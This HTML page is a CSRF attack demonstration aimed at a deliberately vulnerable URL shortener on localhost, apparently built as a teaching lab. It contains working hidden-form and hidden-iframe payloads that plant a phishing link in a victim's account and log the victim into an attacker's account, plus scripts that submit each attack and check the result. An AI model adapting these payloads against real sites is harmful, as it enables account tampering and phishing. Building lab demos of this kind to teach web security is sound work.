<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF Attack Demonstration</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            max-width: 800px; 
            margin: 50px auto; 
            padding: 20px; 
        }
        .form-container {
            background: #f5f5f5; 
            padding: 20px; 
            border-radius: 5px;
            margin-bottom: 20px;
        }
        button {
            background: #ff5722; 
            color: white; 
            padding: 10px 20px; 
            border: none; 
            border-radius: 4px; 
            cursor: pointer;
        }
        button:hover { background: #d84315; }
        .status { 
            margin: 10px 0; 
            padding: 10px; 
            border-radius: 4px; 
            font-weight: bold; 
        }
        .success { 
            background: #d4edda; 
            color: #155724; 
            border: 1px solid #c3e6cb; 
        }
        .warning { 
            background: #fff3cd; 
            color: #856404; 
            border: 1px solid #ffeaa7; 
        }
        .error { 
            background: #f8d7da; 
            color: #721c24; 
            border: 1px solid #f5c6cb; 
        }
    </style>
</head>
<body>
    
    <h1>CSRF Attack Demo</h1>
    <p>This page demonstrates CSRF attacks against the vulnerable URL shortener.</p>
    
    <div class="form-container">
        <h3>Attack #1: URL Creation CSRF</h3>
        <p>Creates malicious URL in victim's account:</p>
        
        <form id="urlCsrfForm" action="http://localhost:8000/shorten/" method="post" target="hiddenFrame2">
            <input type="hidden" name="url" value="http://malicious-phishing-site.com/steal-credentials">
            <input type="hidden" name="notes" value="Malicious URL created via CSRF attack">
        </form>
        
        <iframe name="hiddenFrame2" style="display:none;" onload="handleIframeLoad()"></iframe>
        <button onclick="submitUrlAttack()">Execute URL Attack</button>
        <div id="urlStatus" class="status" style="display: none;"></div>
        <p><em>This will create a malicious URL in the currently logged-in user's account</em></p>
    </div>
    
    <div class="form-container">
        <h3>Attack #2: Login CSRF (Session Fixation)</h3>
        <p>Logs victim into attacker's account:</p>
        
        <form id="loginCsrfForm" action="http://localhost:8000/login/" method="post" target="hiddenFrame1">
            <input type="hidden" name="username" value="attacker">
            <input type="hidden" name="password" value="password123">
        </form>
        
        <iframe name="hiddenFrame1" style="display:none;" onload="handleLoginIframeLoad()"></iframe>
        <button onclick="submitLoginAttack()">Execute Login Attack</button>
        <div id="loginStatus" class="status" style="display: none;"></div>
        <p><em>This will log you into the main app as "attacker" without leaving this page</em></p>
    </div>

    <div class="instructions">
        <h3>How to Test:</h3>
        
        <h4>Setup:</h4>
        <ol>
            <li>Open <a href="http://localhost:8000" target="_blank">the shortener app</a> in a new tab and log in</li>
            <li>Keep both tabs open</li>
        </ol>
        
        <h4>Attack #1 - URL Creation:</h4>
        <ol>
            <li>Click "Execute URL Attack" above</li>
            <li>Check <a href="http://localhost:8000/my-urls/" target="_blank">"My URLs"</a> in the shortener tab to see the malicious URL</li>
        </ol>
        
        <h4>Attack #2 - Login/Session Fixation:</h4>
        <ol>
            <li>Click "Execute Login Attack"</li>
            <li>Refresh the shortener tab to confirm you're logged in as "attacker"</li>
        </ol>
        
        <h3>Why This Works:</h3>
        <ul>
            <li>Endpoints lack CSRF protection (<code>@csrf_exempt</code>)</li>
            <li>Browser automatically sends authentication cookies with cross-origin requests</li>
            <li>Server trusts any request with valid cookies</li>
        </ul>
    </div>

    <script>
        function submitUrlAttack() {
            console.log('Executing URL creation CSRF attack...');
            attackSubmitted = true;
            
            const status = document.getElementById('urlStatus');
            status.style.display = 'block';
            status.className = 'status warning';
            status.innerHTML = 'Submitting attack... Please wait...';
            
            // Submit the form to hidden iframe
            document.getElementById('urlCsrfForm').submit();
            
            // Show success message after a delay to allow form submission
            setTimeout(() => {
                if (attackSubmitted) { // Still submitted, iframe didn't load
                    status.className = 'status success';
                    status.innerHTML = 'Attack submitted! Check <a href="http://localhost:8000/my-urls/" target="_blank">My URLs</a> to verify if the malicious URL was created.';
                    attackSubmitted = false;
                }
            }, 3000);
        }
        
        let attackSubmitted = false;
        
        function handleIframeLoad() {
            if (attackSubmitted) {
                console.log('Form submission completed');
                const status = document.getElementById('urlStatus');
                status.className = 'status success';
                status.innerHTML = 'Attack completed! Check <a href="http://localhost:8000/my-urls/" target="_blank">My URLs</a> to see if the malicious URL was created.';
                attackSubmitted = false;
            }
        }
        
        let loginAttackSubmitted = false;
        
        function submitLoginAttack() {
            console.log('Executing login CSRF attack...');
            loginAttackSubmitted = true;
            
            const status = document.getElementById('loginStatus');
            status.style.display = 'block';
            status.className = 'status warning';
            status.innerHTML = 'Submitting login attack... Please wait...';
            
            // Submit the form to hidden iframe
            document.getElementById('loginCsrfForm').submit();
            
            // Show success message after a delay and check login status
            setTimeout(() => {
                if (loginAttackSubmitted) { // Still submitted, iframe didn't load
                    status.className = 'status success';
                    status.innerHTML = 'Login attack submitted! Checking if you\'re now logged in as "attacker"...';
                    loginAttackSubmitted = false;
                    // Check login status after a short delay
                    setTimeout(checkLoginStatus, 1000);
                }
            }, 2000);
        }
        
        function handleLoginIframeLoad() {
            if (loginAttackSubmitted) {
                console.log('Login form submission completed');
                const status = document.getElementById('loginStatus');
                status.className = 'status success';
                status.innerHTML = 'Login attack completed! Checking if you\'re now logged in as "attacker"...';
                loginAttackSubmitted = false;
                // Check login status after iframe loads
                setTimeout(checkLoginStatus, 1000);
            }
        }
        
        function checkLoginStatus() {
            fetch('http://localhost:8000/', {
                method: 'GET',
                credentials: 'include'
            })
            .then(response => response.text())
            .then(html => {
                const status = document.getElementById('loginStatus');
                if (html.includes('Welcome, attacker') || html.includes('attacker')) {
                    status.className = 'status success';
                    status.innerHTML = 'SUCCESS: Logged in as "attacker"!';
                } else {
                    status.className = 'status error';
                    status.innerHTML = 'Not logged in as attacker';
                }
                status.style.display = 'block';
            })
            .catch(error => {
                console.log('Status check failed:', error);
            });
        }
        
        // Auto-check login status
        window.onload = function() {
            setTimeout(checkLoginStatus, 1000);
            setInterval(checkLoginStatus, 5000);
        };
    </script>
</body>
</html>
